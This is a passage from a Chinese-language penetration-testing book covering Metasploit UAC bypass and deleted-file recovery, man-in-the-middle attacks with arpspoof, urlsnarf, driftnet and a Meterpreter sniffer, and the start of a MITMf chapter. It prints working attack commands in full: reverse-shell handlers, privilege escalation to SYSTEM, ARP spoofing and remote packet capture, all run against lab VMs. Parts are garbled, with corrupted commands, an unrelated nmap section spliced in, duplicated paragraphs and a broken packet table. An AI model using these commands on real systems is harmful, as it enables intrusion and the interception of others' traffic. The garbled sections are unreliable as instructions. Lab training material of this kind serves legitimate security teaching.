你可以使用上一章中的“CutePuppy”攻击。建议重启 Windows 7 虚拟机，退出并重启 Metasploit，这样攻击才能正常运行。如果不这样做，可能会在 Metasploit 中获得来自 Windows 7 系统的多个会话？

- 1. 运行 Metasploit 并启动 multi-handler。
```bash
msf > multi/handler
msf exploit(multi/handler) > payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.1.39
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > exploit
```

- 2. 在你的 Windows 7 系统上双击“CutePuppy.bat”文件。
- 3. 如果你处于 Meterpreter 提示符处，输入“background”。
- 4. 输入“sessions”查看你的活动会话。

如截图所示：

> [* Meterpreter session 1 opened (192.168.1.39:4444) => 192.168.1.93:49159)
[*] Meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > sessions

| Id | Name | Type | Information |
|---|---|---|---|
| 1 | meterpreter | x86/windows | WIN-420RBM3SRVF\Dan @ WIN-420RBM3SRVF |

```
msf exploit(multi/handler) > |
```

Metasploit 中有多个绕过 UAC 的模块。随着安全研究的进展和变化，你会发现曾经在某一点有效的模块现在不再起作用，你需要运行另一个。这只是安全测试中作为“猫鼠游戏”的正常组成部分。一个漏洞生效了，被补丁了，一个新的漏洞被创建了，等等。我们现在介绍一个绕过 UAC 的模块；第二个模块将在章末尾介绍。

在编写本文时，“Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)”模块对 Windows 7 系统效果良好。它的运行非常简单，因为你在新模块中需要设置的只是活动会话。

- 5. 输入 `use exploit/windows/local/bypass_uac` 并按回车。
- 6. 接下来，输入 `show options`：
```bash
msf exploit(multi/handler) > use exploit/windows/local/bypass_uac
msf exploit(windows/local/bypass_uac) > show options
```

模块选项 (exploit/windows/local/bypass_uac):

| Name | Current Setting | Description |
|---|---|---|
| SESSION | yes | 运行此模块的会话。 |
| Exploit: | | |
| Id | 0 | Automatic |

- 7. 输入 `set SESSION 1`
- 8. 然后执行 `exploit` 将执行绕过 UAC 模块，创建一个禁用了 UAC 的新会话。

从上面的图中可以看到，Bypass UAC 模块运行并创建了 Session 2。最后，我们连接到该系统并处于 Meterpreter 提示符处。在 Meterpreter 提示符下输入“getsystem”然后输入“getuid”：

```bash
meterpreter > getsystem
got system via (Named Pipe Impersonation)
meterpreter > getuid
username: NT AUTHORITY\SYSTEM
```

我们现在应该 Windows 系统上拥有了 System 级权限！现在我们已经从管理员级账户提升到了 System 级账户，我们可以访问 Windows 中某些受保护的区域。例如，使用 `post/windows/dump` 命令：

```bash
meterpreter > run post/windows/dump
```

从远程系统恢复删除的文件

Interpreter 中有很多模块可用。现在我们有了 System 访问，让我们看看如何使用一个模块恢复从磁盘删除的文件。“recovery_files”脚本允许你恢复目标删除的文件。这可能非常有用，因为删除的文件可能包含感兴趣的信息。系统文件和日志、账户信息以及文档为了准备这个示例，我只是在 Windows 7 系统上创建了一个虚假的“Accounts Words.txt”文件，并将 Nmap 的“Discovery.pdf”手动保存到连接到虚拟机的 NTFS 格式 U 盘上。该模块要求你对要检查的目标有一个打开的会话。我们将简单地使用上一节中获得的会话。一旦成功建立远程会话，我们需要将活动会话后台化，临时回到 ms 提示符，然后运行该模块。

**“background”**
然后，使用 `post/windows/gather/forensics/recovery_files`
最后，**“show options”**：

```bash
meterpreter > background session
execute -f c:\windows\samac\combinehack > post/windows/gather/forensics/recovery_files
post(post/windows/gather/forensics/recovery_files) > show options
```

模块选项 (post/windows/gather/forensics/recovery_files):

| Name | Current Setting | Description |
| ---|---|---|
| DRIVE | yes | 你想要恢复文件的驱动器。 |
| FILES | no | 用逗号分隔的要恢复的文件 ID 或扩展名。 |
| SESSION | yes | 运行模块的会话。 |
| TIMEOUT | 3600 | yes | 搜索超时。如果为 0，模块将遍历整个 |


现在我们只需要设置驱动器和会话变量。我们将在示例中使用会话 2，因为访问被删除的文件需要系统级权限。

```
msf post(windows/gather/forensics/recovery_files) > set DRIVE E:
DRIVE => E:
msf post(windows/gather/forensics/recovery_files) > set SESSION 2
SESSION => 2
```

最后输入 "run" 来执行该模块：

```
msf post(windows/gather/forensics/recovery_files) > run
[*] System Info - OS: Windows 7 (Build 7600), Drive: E:
[*] $MFT is made up of 1 dataruns
[*] Searching deleted files in data run 1 ...
[*] Name: DISCOV-1.PDF ID: 3221263360
[*] Name: ACCOUN-1.TXT ID: 3221263360
[*] MFT entries finished
[*] Post module execution completed
```

后模块运行了，正如你所看到的，它找到了从连接到 Windows 系统的 USB  own上删除的两个文件。现在，假设我们想恢复 .txt 文件。

只需输入 "set FILES txt" 并再次运行利用：

```
msf post(windows/gather/forensics/recovery_files) > set FILES txt
FILES => txt
msf post(windows/gather/forensics/recovery_files) > run
[*] System Info - OS: Windows 7 (Build 7600), Drive: E:
[*] $MFT is made up of 1 dataruns
[*] Searching deleted files in data run 1 ...
[*] Name: DISCOV-1.PDF ID: 3221263360
[*] Name: ACCOUN-1.TXT ID: 3221263360
[*] Hidden file found!
[*] File is downloaded: ACCOUN-1.TXT
[*] The file is resident: ACCOUN-1.TXT
[*] File saved on /root/msf4/tmp/201809313321__12.166.1.3.3_086240.txt
[*] Post module execution completed
msf post(windows/gather/forensics/recovery_files) >
```

它恢复了文件并将其存储在 "/root/msf4//" 目录下。如果我们浏览到该目录，就可以找到并打开保存的文件。这是一个隐藏目录，所以如果你使用的是 Kali 浏览器，需要点击菜单右上角的三线图标，然后点击“显示隐藏文件”（Show Hidden Files）。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_177_0.png)

并查看文件：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_177_1.png)

搞定，看起来有 3 个用户账户，包括密码，我们已经从远程机器上恢复了它们！但如果我们想恢复 .pdf 文件呢？

再次，只需输入 "set FILES pdf" 并再次运行利用：

```
msf post(windows/gather/forensics/recovery_files) > set FILES pdf
FILES => pdf
msf post(windows/gather/forensics/recovery_files) > run
[*] System Info - OS: Windows 7 (Build 7600), Drive: E:
[*] $MFT is made up of 1 dataruns
[*] Searching deleted files in data run 1 ...
[*] Name: DISCOV-1.PDF ID: 3221026336
[*] Hidden file found!
[*] File to download: DISCOV-1.PDF
[*] The file is not resident. Saving DISCOV-1.PDF ... (112865 bytes)
[*] File saved on /root/.msft/loot/201805331161051_default_192.168.1.193
[*] Name: ACCOUNT-1.TXT ID: 3221026336
[*] MFT entries finished
[*] Post module execution completed
msf post(windows/gather/forensics/recovery_files) > 
```

和上一次一样，恢复的文件存储在 loot 目录中。

我们可以打开 Nmap PDF 文件来验证它是否有效：

在本文中，我们将使用具有多种防火墙规则集的 DMZ 环境来说明发现防火墙后主机的最佳方法。我们在全文中将使用的 DMZ 架构如图所示：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_178_0.png)

我们有一个带有防火墙过滤入站流量的典型 DMZ。在我们的场景中，我们使用 -rules 来保持规则的可读性。它们的实际状态在不同设置之间可能会有所不同，为了避免纠结于准确性，只需要重新读取即可。此外，我们用于测试的 nmap 版本是 3.0。

我们的扫描工具托管在 192.168.5.0/24 网络上，IP 地址为 192.168.5.20。

除非另有说明，我们将使用以下 nmap 命令进行发现扫描：
nmap -p 172.26.1/29

你可以通过简单的在 FILES 变量中列出你想要的内容并用逗号分隔，一次性恢复多个文件类型。最后，也可以通过 ID 数字恢复文件。

## 模块总结

该模块在数据驱动器上运行良好良好，但在可能有大量文件需要恢复的驱动器上并不理想，例如单硬盘系统的主驱动器。我在一个经常使用的 Windows 7 虚拟机上运行了它，实际上真的花了几个小时。虽然它可能找到了一千个文件，但我无法看出这在现实生活中是否可行，因为会产生大量的可疑网络流量。

这里是针对带有大量删除文件的驱动器运行的网络流量的后续包捕获：

| No. | Source | Destination | Protocol | Length | Info |
|---|---|---|---|---|---|
| 674 | 1330245059 | 192.168.1.192 | 192.168.1.147 | TCP | 128 |
| 675 | 1330245060 | 192.168.1.192 | 192.168.1.132 | TCP | 54 |
| 676 | 1330245061 | 192.168.1.192 | 192.168.1.132 | TCP | 128 |
| 677 | 1330245070 | 192.168.1.192 | 192.168.1.132 | TCP | 54 |
| 678 | 416556058 | 192.168.1.192 | 192.168.1.132 | TCP | 128 |
| 679 | 1330245099 | 192.168.1.192 | 192.168.1.147 | TCP | 54 |
| 680 | 1432245559 | 192.168.1.192 | 192.168.1.132 | TCP | 14 |
| 681 | 1132245558 | 192.118.1.112 | 192.118.1.112 | | 12 |
| | | | | | 22111221111111111111111111111111111111111111111111111111111111111111111111111111111 | | | | |
| 682 | 1432245557 | 192.168.1.192 | 192.168.1.132 | TCP | 128 |
| 683 | 1432245556 | 192.168.1.192 | 192.168.1.132 | TCP | 54 |
| 684 | 1432245551 | 192.168.1.192 | 192.168.1.132 | TCP | 54 |
| 685 | 1432245550 | 192.168.1.192 | 192.168.1.132 | TCP | 54 |
| 686 | 1538245059 | 192.168.1.192 | 192.168.1.147 | TCP | 128 |

和上一次一样，恢复的文件存储在 loot 目录中。

我们可以打开 Nmap PDF 文件来验证它是否有效：

该模块似乎在数据驱动器上工作良好，但在可能有大量文件需要恢复的驱动器上并不理想，例如单硬盘系统的主驱动器上。我在一个经常使用的 Windows 7 虚拟机上运行了它，实际上真的花了几个小时。虽然它可能找到了一千个文件，但我无法看出这在现实生活中是否可行，因为会产生大量的可疑网络流量。




一旦我们获得了系统级权限，我们就可以执行任何想做的操作。我们通过从安全数据库中导出密码哈希演示了这一点。然后，我们演示了如何利用系统级权限和 Metasploit 从闪存驱动器恢复被删除的文件。

UAC 绕过之所以可行，是因为我们所访问的用户账户是管理员级别的账户。必须始终给用户提供非管理员级别的账户。应该认真考虑违反这一规则进行例外处理可能带来的安全后果。

## 资源

https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_cmhijack

## 攻击主机

# 第 13 章
中间人攻击

这是一种对于安全测试人员可能有利的技术，用于监控或捕获网络流量。数据包捕获类似于电话窃听。正如窃听器记录了一个人在电话上说的所有一样，数据包捕获记录了你的计算机在网络线上传输的所有内容。这可能包括账户名称、密码等。对于攻击者来说，捕获或查看数据包的方法之一是使用中间人攻击。

## 引言

在本节中，我们将通过两种不同的过程来查看网络包。对于第一个，我们将在本地网络系统上使用 `arpspoof`、`urlsniff` 和 `driftnet` 命令进行中间人（MitM）攻击。这些命令允许我们查看目标所在的网站，并显示目标正在查看的一些图形。其次，我们将介绍通过 Metasploit 会话在远程机器上运行数据包捕获。然后我们将使用 Wireshark 和 Xplico 查看捕获信息的痕迹。在这两种情况下，我们都使用 Windows 7 虚拟机作为目标系统。

中间人攻击本质上是将 Kali 系统置于目标和路由器之间。因此，我们可以看到所有来自和发往目标系统的流量。从目标系统发往互联网的所有首先重路由到我们的机器，然后由我们捕获并转发到网络。从互联网发往目标机器的信息首先通过我们的系统，再次以便我们可以审查，然后转发到目标系统。

我们可以在下面的图中看到这一点：

## 正常通信

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_184_0.png)

通常，用户 Alice 通过她的路由器直接连接互联网。在中间人攻击下，黑客将自己插入到正常通信路径的中间，可以看到 Alice 发送到互联网的所有内容的副本以及从那里返回的所有内容。

## 中间人攻击

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_184_1.png)

这是通过修改路由器和目标系统上的 ARP（地址解析协议）表来实现的。ARP 表告诉我们 IP 地址位于哪个物理 MAC 地址。因此，作为攻击者，我们告诉目标机器我们是互联网路由器，告诉路由器我们是目标系统，有效地将我们置于通信流的中间。有很多工具可以使用来执行中间人攻击。Arpspoof 是其中一个存在很长时间的工具，仍然是一个首选工具。我们将看到如何使用 Arpspoof 创建中间人攻击，然后使用其他工具查看网络流量。

注意：

某些高级反病毒安全软件会保护 ARP 表免受中间人攻击。

## 使用 Arpspoof 创建中间人攻击

我们可以使用 `arpspoof` 轻松修改 ARP 表，但首先我们需要通过运行以下命令来开启 IP 转发：

- 1. 打开终端并输入，`echo 1 > /proc/sys/net/ipv4/ip_forward`

接下来，我们需要运行 `arpspoof` 命令。为了这样做，我们需要提供网络接口 (-i)、目标系统 (-t) 和路由器地址，如下所示：
- 2. 然后，输入 `arpspoof -i eth0 -t 192.168.1.93 192.168.1.1`

```
root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward
root@kali:~# arpspoof -i eth0 -t 192.168.1.93 192.168.1.1
```

- 3. 现在，打开第二个终端并输入，`arpspoof -i eth0 -t 192.168.1.93`

这基本上是同一个命令；只是计算机的 IP 和路由器的 IP 交换了。Arpspoof 应该开始发送修改后的 MAC 地址。现在让我们看看能从目标系统中捕获到什么。

## 使用 Ulsnarf 查看 URL 信息

工具作者：Dug Song

工具网站：https://www.monkey.org/~dugsong/dsniff/

首先，我们将查看在目标浏览互联网时是否可以捕获到地址。

```
root@kali:~# ulsnarf -i eth0
ulsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
```

现在正如 ulsnarf 在网页上所示的，我们将看到所有的流量：

```
ulsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
DESKTOP-AT70 - [12/Jun/2018:13:57 -0400] HTTP/1.1
192.168.1.93 - [12/Jun/2018:13:57 -0400] "GET http://download.mozilla.org/?product=firefox-43.0&lang=en-US HTTP/1.1" "Mozilla/5.0 (Windows NT 6.1; rv:39.0)"
```

这允许我们看到用户在 Kali 系统上访问的所有网站！

- 2. 按 `Ctrl-c` 退出 ulsnarf

当你想查看目标在做什么时，Urlsniffer 很有用。它不会解码加密的通信；你需要不同的工具来实现这一点。我们稍后会介绍这些工具。

## 使用 Driftnet 查看捕获的图形

**工具作者：**Chris Lightfoot
**工具网站：**http://driftnet

文本很有趣，但你可以使用名为 "Driftnet" 的程序查看访问的图片。尽管 Driftnet 命令似乎不像以前那样好用了，只能提取特定大小的 .gif 文件，但是一个值得尝试的程序。

- 1. 简单输入 "driftnet" 命令和接口 (-i)，如下：
```
root@kali:~# driftnet -i eth0
```

- 2. 一个 driftnet 窗口会在你的 Kali 上打开。放大它以便于查看。
- 3. 返回目标计算机并浏览网页。

你应该开始看到图片出现在你的 Kali 系统上。尝试这种技术一段时间查看图片。完成后，按 "Ctrl-c" 退出 driftnet，然后在每个终端再次运行 `arpspoof` 恢复原始 ARP 表。有很多其他工具可以使用来查看捕获的数据并进行分析。我们稍后会介绍 Xplico。

## 在 Metasploit 中进行远程数据包捕获

如果在目标系统的同一个本地网络，那样很好，但如果目标系统是远程的呢？如果我们通过 exploit 获取 Meterpreter shell，就可以远程记录目标系统的流量。为了实现这一点，我们将从活动的 Windows 7 meterpreter 会话开始。如果你需要复习，这里是在 Metasploit 中设置 multi-handler：

```
msf > use multi-handler > set payload windows/meterpreter/reverse_tcp
msf exploit(multi-handler) = windows/meterpreter/reverse_tcp
msf exploit(multi-handler) > set LHOST 192.168.1.39
LHOST => 192.168.1.39:4444
msf exploit(multi-handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi-handler) > exploit
```

```
[*] Started reverse TCP handler on 192.168.1.39:4444
[*] Sending stage (179779 bytes) to 192.168.1.93
[*] Meterpreter session 1 opened (192.168.1.39:4444) -> 192.168.1.93:526122
18-06-14 14:39:50 -0400
```

```
meterpreter >
```

使用 UAC 绕过模块运行 UAC，步骤所示：

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/windows/local/bypass_injection
msf exploit(windows/local/bypass_injection) > set session 1
session => 1
msf exploit(windows/local/bypass_injection) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(windows/local/bypass_injection) > set LHOST 192.168.1.39
LHOST => 192.168.1.39
msf exploit(windows/local/bypass_injection) > set LPORT 4544
LPORT => 4544
msf exploit(windows/local/bypass_injection) > exploit
[*] Started reverse TCP handler on 192.168.1.39:4544
[*] Windows 7 (Build 7608), may be vulnerable.
[*] UAC is enabled, checking level...
[*] Farm of Administrators group! Continuing...
[*] UAC is set to Default
[*] Bypass enabled by setting, continuing...
[*] Uploading the DLL to the filesystem.
[*] Successfully injected process with Windows Publisher Certificate, to inject into...
```

```
meterpreter >

```

我们处于禁用了 UAC 的 Session 2 中。现在我们需要获取系统级权限。我以前使用 "packetrecorder"，这是一个很有用的工具，但它已经被弃用了。它建议使用 `post/windows/manage/rcpcad_start`，但如果目标没有运行 wincap，这也不起作用。如前所述，在 Kali 中做任何事情都有多种方法，让我们使用 Metasploit Sniffer 吧。
2. 在 Meterpreter 提示符处输入 "use sniffer"。




3. 现在输入 "help"。你的 Meterpreter 命令中应该多了一个新选项：

| Command | Description |
|--- | --- |
| sniffer_dump | 将捕获的数据包数据检索到 PCAP 文件中 |
| sniffer_interfaces | 列出所有可嗅探的网络接口 |
| sniffer_release | 释放特定接口上已捕获的数据包 |
| sniffer_start | 在特定接口上开始捕获 |
| sniffer_stats | 查看活动捕获的统计信息 |
| sniffer_stop | 停止特定接口上的数据包捕获 |

4. 输入 "sniffer_interfaces" 查看目标上可用的网络接口列表：

我的 Windows 7 目标有两个接口（你的可能不同），一个 WAN Miniport 和一个 Intel NIC。我将使用 #2 号接口（Intel NIC）进行嗅探。

5. 要开始捕获数据包，输入 "sniffer_start 2"。

6. 现在，回到 Windows 7 目标系统并进行上网。你访问的每一个地方和发送的每一个网络包都将记录在 Kali 系统中。

7. 要保存你捕获的内容，输入 "sniffer_dump 2 /tmp/win7capture.cap"。

就是这样；所有数据将保存在 "/tmp/win7capture.cap" 文件中。

8. 完成后，输入 "sniffer_stop 2" 停止嗅探，输入 "sniffer_release 2" 丢弃额外的数据包。

## 使用 Wireshark 分析数据包

现在我们有了捕获的数据包，该如何处理呢？Wireshark 是一款强大的数据包捕获和分析程序，拥有大量功能。我们将使用这个工具快速查看我们的捕获的数据包。

- 1. 要启动 Wireshark，从 'Applications > 09 - Sniffing and Spoofing>' 菜单中选择，或者直接从终端提示符运行它：

```
root@kali:-# wireshark &
```

- 2. 对于以超级用户运行的警告信息，点击 "OK"。

- 3. 点击 "File"，然后点击 "Open" 打开我们的数据包文件。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_189_0.png)

- 4. 点击 "Protocol" 按协议排序并向下滚动找到 FTP 部分：

| Protocol | Info |
| FTP | Response: 220 (vsFTPd 2.2.2) |
| FTP | Request: USER anonymous |
| FTP | Response: 331 Please specify the password. |
| FTP | Request: PASS mozilla@example.com |
| FTP | Response: 230 Login successful. |
| FTP | Request: SYST |
| FTP | Response: 215 UNIX Type: L8 |
| FTP | Request: PWD |
| FTP | Response: 257 "*" |
| FTP | Request: TYPE I |
| FTP | Response: 200 Switching to Binary mode. |
| FTP | Request: PASV |
| FTP | Response: 227 Entering Passive Mode (12,130,207,40,243,35) |

如果用户连接到任何未加密的 FTP 会话（如上面的示例），你将看到整个会话。要以明文查看会话，右键点击服务器 IP 并点击 "Follow TCP Stream"。你将看到如下所示流内容：

```
Stream Content:
220 (vsFtpd) 2.2.2)
230 anonymous
331 Please specify the password.
PASS mozilla@example.com
230 Login successful.
SYST
217 UNIX Type: h4
PWD
257 /
200 Switching to Binary mode.
PAS
227 Entering Passive Mode (12,130,207,40,235):
512 /Gateway/dir615_revC/Manual/dir615_revC_manual_300.pdf
226 12254902
MTM /Gateway/dir615_revC/Manual/dir615_revC_manual_300.pdf
226 12254902
RETR /Gateway/dir615_revC/Manual/dir615_revC_manual_300.pdf
150 Opening BINARY data connection for /Gateway/dir615_revC/Manual/
dir615_revC_manual_300.pdf (12254902 bytes).
226 Transfer complete.
```

如上面的示例所示，我们有了一个完整的 FTP 登录和文件下载捕获。Wireshark 非常适合用于分析网络通信，你可以用它做很多事情，但对于新用户来说它有点复杂，可能很难熟悉。所以，让我们用最后一个程序查看我们的捕获数据包。Xplico 以易读的菜单列出了数据包获中的所有信息，它还允许我们查看任何图像或文档。

## Xplico

**工具作者：** Gianluca Costa, Andrea de Franceschi 及贡献者
**工具网站：** https://www.xplico.org/

Xplico 已添加到 Kali 存储库，但你的系统中可能尚未安装。它是一个基于 Web 的界面，因此要启动它，你需要 Apache Web Server 和 Xplico 服务。在 Kali 的 "System Services" 下，你应该能看到 Xplico。如果没有列出，则需要安装。运行以下命令进行安装：

```
apt install xplico
```

```
root@kali:~# apt install xplico
Reading package lists...
Building dependency tree...
The following packages were automatically installed
hn-python libbabeltrace-ctf libcbamell-crypt-openssl-sa-perl libcrypt-openssl-random-rsa-perllibledataserver-ui-file-copy-perl
```

现在我们需要启动 Xplico 和 Apache 服务。

- 1. 在终端输入 “service apache2 start”。
- 2. 在 Applications “System Services” 下启动 Xplico![](img/37a3b7ef116f9ef991f9e33dd8b348c7_191_0.png)。一旦 Xplico 启动，通过 Web 界面访问它。

- 3. 打开浏览器并访问“localhost:9876”![](img/37a3b7ef116f9ef991f9e33dd8b348c7_191_1.png)。

- 4. 使用用户名 "xplico" 和密码登录![](img/37a3b7ef116f9ef991f9e33dd8b348c7_192_0.png)。

- 5. 现在点击 "Uploading PCAP files"。
- 6. 给它一个 Case 名称并点击 "Create"![](img/37a3b7ef116f9ef991f9e33dd8b348c7_192_1.png)。
- 7. 点击新创建的 case。
- 8. 在 Case 下，点击 "New Session![](img/37a3b7ef116f9ef991f9e33dd8b348c7_192_2.png)。
- 9. 给会话命名，然后点击 "Create"![](img/37a3b7ef116f9ef991f9e33dd8b348c7_192_3.png)。
- 10. 点击会话名称。
- 11. 显示主会话桌面。
- 12. 在 "Pcap set" 部分，浏览并上传你的 pcap 文件：

## PCAP-over-IP TCP port: 3000

添加新的 pcap 文件。
浏览 win7capture.cap
上传所有 pcap 文件。

文件将上传到 Xplico 并解码。几秒到几分钟后（取决于你的 Pcap 文件大小），你将看到如下结果：

| HTTP | | MMS | | Emails |
|---|---|---|---|---|
| Post | 25 | Number | 0 | Received | 0 |
| Get | 471 | Contents | 0 | Sent | 0 |
| Video | 2 | Video | 0 | Unread | 0/0 |
| Images | | Images | | |

| Facebook Chat / Patalk | | ICPalk Expsn | | Dns - ARP - icmp4 |
|---|---|---|---|---|
| Users | 0 | Server | 0 | DNS res | 225 |
| Chats | 0/0 | Channels | 0/0 | ARP/ICMPv6 | 37/4 |
| Feed (Risk & Atom) | | Printed Files | | Telnet / Syslog |
|---|---|---|---|---|
| Number | 0 | Pdf | 0 | Connections | 0/0 |

## 注意：

> 如果文件太大，将收到错误消息。如果是这样，你可以按照消息建议编辑 Apache 配置文件，或者尝试较小的会话。

如果我们点击 Web 菜单下的 “Site”，我们将看到目标访问的网站列表：

| Date | Url |
|---|---|
| 2013-11-05 10:22:25 | support.dlink.com/emulators/dir615_reva/110/index.htm |
| 2013-11-05 10:22:23 | support.dlink.com/ErrorPage.htm |
| 2013-11-05 10:22:25 | support.dlink.com/emulators/dir615_reva/ |
| 2013-11-05 10:22:24 | support.dlink.com/favicon.ico |
| 2013-11-05 10:22:24 | support.dlink.com/Productinfo.aspx?m=favicon |
| 2013-11-05 10:21:33 | www.google.com/url?sa=t&r=q&es=source |
| 2013-11-05 10:21:05 | www.google.com/ |
| 2013-11-05 10:20:45 | www.dell.com/us/ |
| 2013-11-05 10:20:25 | www.dell.com/us/p |

如你所示，目标正在浏览 Dell 网站寻找 Powervault Backup。接下来，他们去了 Google，然后是 D-Link 支持查找信息。即使没有通过 Xplico 恢复密码，你也可以使用 Web 标签收集信息。例如，我注意到访问的几个网站都是 NHL。

显然，该用户是一个冰球粉丝。我可能从他的上网习惯中恢复他喜欢的球队，并将其用于社会工程学攻击。你还可以点击 "Graphs" 菜单标签页，并查看捕获的 DNS、ARP 和 Lcmpv6 信息：



| 搜索: Go | 日期 | 主机 | CName |
|---|---|---|---|
| 2018-06-15 10:36:25 | eu.double.com | id.google.com | |
| 2018-06-15 10:36:25 | adsverse.google.com | pagead4l.doubleclick.net | |
| 2018-06-15 10:36:11 | fhdata.mobile.com | fhr553-2.services.com | |
| 2018-06-15 10:36:11 | api.google.com | plus.google.com | |
| 2018-06-15 10:36:11 | www.static.com | sst.static.com | |
| 2018-06-15 10:36:10 | www.google.com | | |
| 2018-06-15 10:36:10 | download.cdx.mobile.com | 2-01-2967-001.cdex.codex. | |

检查 Wireshark 菜单中其他可用选项（如 Mail、Chat 和 Shell），查看你可以看到的其他信息。如果你想尝试更高级的可选挑战，请回到本章的 Metasploit 封包捕获。当你到达目标浏览部分时，登录 Metasploitable2 的 Web 界面以及 Metasploitable2 的 telnet 和 ftp 服务。然后尝试保存数据包包并在 Wireshark 中查看，看看它是否捕获了包括登录在内的任何数据。

完成后，使用 Kali 菜单停止 Wireshark 服务：

## Applications > 14-System Services > Wireshark Stop

## 结论

在本章的第一部分中，我们涵盖了如何使用中间人攻击程序 Arpoof。我们还使用了 Etterncap 和 Driftnet 来观察目标系统正在访问哪些网站。在第二部分中，我们探索了如何使用 Meterpreter 将受攻击的系统转换为远程数据包嗅器。然后，我们在 Wireshark 中分析了捕获的流量。这是查看目标系统正在进行的非加密操作的简单方法。在下一章中，我们将查看如何使用“中间人框架”（Man-in-the-Middle Framework）执行自动化 MitM 攻击。

## 第14 章

## 中间人框架 & BeEF

## 中间人框架

**工具作者:** bybtl33d3r

**工具网站:** https://github.com/bytbl33d3r/MITMf

中间人框架 (MITMF) 是一个功能丰富的中间人超级工具。它基本上是一个替代许多其他 MitM 程序的终极工具。根据作者网站，它包含了内置的 SMB、HTTP 和 DNS 服务器，并执行 SSLStrip 和部分 HSTS 绕过。该工具可以捕获 FTP、IRC、POP、IMAP、Telnet、SMTP、SNMP 团体字符串、NTLM2 和 Kerberos 凭据。MITMF 有许多攻击选项（称为插件），我们将介绍其中几个。在本章中，我们将 Windows 7 虚拟机作为目标，但它也适用于通过 Wi-Fi 连接到本地网络的移动设备。这在我的《使用 Kali NetHunter 进行安全测试》书中有所介绍。

> 警告：
> 与所有安全工具一样，在尝试在生产环境中使用工具之前，请确保你完全理解使用该工具（尤其是修改网络流量的工具）的所有后果！

## 安装 MITMF

工具作者网站上提供了完整的安装说明。有几个步骤，但由于该工具位于 Kali 仓库中，我们可以像下面使用 `apt install` 命令完成整个安装：

```
apt install mitmf
```

```
root@kali:~ apt install mitmf
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages were automatically installed and
dh-python libbabeltrace-ctfs libcamel-1.2-60 libcrypt-
libcrypt-openssl-dsa-perl libcrypt-openssl-random-perl
libcrypt-openssl-rsa-perl libcuelaserver-1.2-2
```

这安装了带有所有必要依赖项的 MitMF。它可以从终端提示符运行。

如需查看帮助文件，只需使用 "mitmf --help"

```
root@kali:~ mitmf --help
usage: mitmf.py -interface [mitmf options] [plugin name]
MITMF v0.9.8 - 'The Dark Side'
optional arguments:
  -h, --help show this help message and exit
```

mitmf 的插件选项列在帮助屏幕上。这些插件根据工具作者网站^1 的定义包括：

- **JSkeylogger**: 在客户端的网页中注入 JavaScript 击键记录器
- **BrowserProfiler**: 尝试枚举所有连接客户端的浏览器
- **FilePWN**: 使用 Backdoor Factory 和 BDFProxy 通过 HTTP 发送后门执行文件
- **BeEFAuthor**: 根据客户端的操作系统或浏览器类型自动通过 BeEF 方法
- **SMBAuth**: 触发 SMB 挑战-响应身份验证尝试
- **SSLStrip**: 部分绕过 HSTS
- **Upsidedown**: 将图像翻转 180 度
- **ScreenShutter**: 使用 HTML5 Canvas 渲染客户端浏览的准确截图

运行 MITMF，基本上你只需要决定想要哪些插件，然后使用相应的命令行来启动攻击。MITMF 的妙之处在于，在许多情况下，你可以查看来自加密页面的数据。

## 简单的 ARP 攻击

让我们从针对我们的 Windows 7 虚拟机的简单 ARP 毒骗攻击开始。这种攻击将修改目标系统和路由器的 ARP 表，将我们的攻击系统插入流量中间。

在你的 Windows 7 虚拟机上打开命令提示符并输入 "arp -a"。Windows 将返回 ARP 条目列表，如下所示：

```
C:\Users\Dan>arp -a
Interface 192.168.1.93      Internet Address          
192.168.1.1           dynamic
```

注意路由器 192.168.1.1 列出的 MAC 地址或物理地址。在你的 Kali 虚拟机上：

```
mitmf -i eth0 --spoof arp --gateway 192.168.1.1 --target 192.168.1.93
```

```
root@kali:~# mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.93
[*] MITMF v0.9.8 - 'The Dark Side'
|_ Spoof v0.6
|_ ARP spoofing enabled
|_ Proxy v0.2
|_ SSLStrip v0.9
```
(img/37a3b7ef116f9ef991f9e33dd8b34c7)

现在，回到 Windows 7 系统：再次运行 "arp -a" 命令。你应该会看到路由器的结果有所不同：

```
C:\Users\Dan>arp -a
Interface 192.168.1.93      Internet Address          
192.168.1.1           dynamic
```

你的 Kali 虚拟机的物理地址现在应该被列为路由器！如果你能查看路由器的 ARP 表，你会发现 Windows 机器的物理地址也会被更改并指向 Kali 虚拟机。在 Windows 7 系统上浏览几分钟，你应该会在 MITMF 中看到访问的网站：

```
2018-06-20 14:07:01 192.168.1.93 [type:Firefox - os:Windows] download.org
2018-06-20 14:07:02 192.168.1.93 [type:Firefox - os:Windows] Mozilla.net
2018-06-20 14:07:03 192.168.1.93 [type:Firefox - os:Windows] google.com
```

完成后，按 "Ctrl-c" 停止攻击，MITMF 会恢复原始 ARP 表。注意执行此操作非常快速且简单。如果你运行完全相同的命令但漏掉了目标，MITMF 将对整个子网执行 ARP 攻击！警告这通常不是个好主意，特别是在大型网络中——除非完全理解将整个子网流量重定向到你的 Kali 系统的影响！

## 注意：

如果后续的攻击无效，可能与安装的 Twisted 版本有关。通过运行以下命令安装早期版本的 Twisted 可能会解决问题：

```
pip install Twisted==15.5.0
```

查看 https://github.com/bytbl33d3/MITMF/issues/316

了解 MITMF 的工作原理后，让我们尝试一些插件。Upsidedown 实际上会将目标互联网流中的所有图片翻倒过来！这个插件更多是玩笑而非实用，但它确实演示了实际网站数据如何被操纵。

```
